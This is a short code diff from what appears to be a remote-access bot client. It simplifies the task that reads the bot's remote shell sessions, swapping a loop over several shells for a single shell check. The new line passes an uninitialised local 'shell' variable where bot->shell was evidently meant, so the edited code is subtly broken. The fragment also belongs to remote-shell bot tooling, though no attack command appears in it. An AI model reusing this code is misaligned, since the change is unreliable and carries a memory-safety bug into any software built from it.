@@ -10,14 +10,9 @@ struct sLaika_taskService tService;
 void shellTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
     struct sLaika_shell *shell;
     struct sLaika_bot *bot = (struct sLaika_bot*)uData;
-    int i;
 
-    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
-        shell = bot->shells[i];
-        if (shell) {
-            laikaB_readShell(bot, shell);
-        }
-    }
+    if (bot->shell)
+        laikaB_readShell(bot, shell);
 }
 
 int main(int argv, char **argc) {
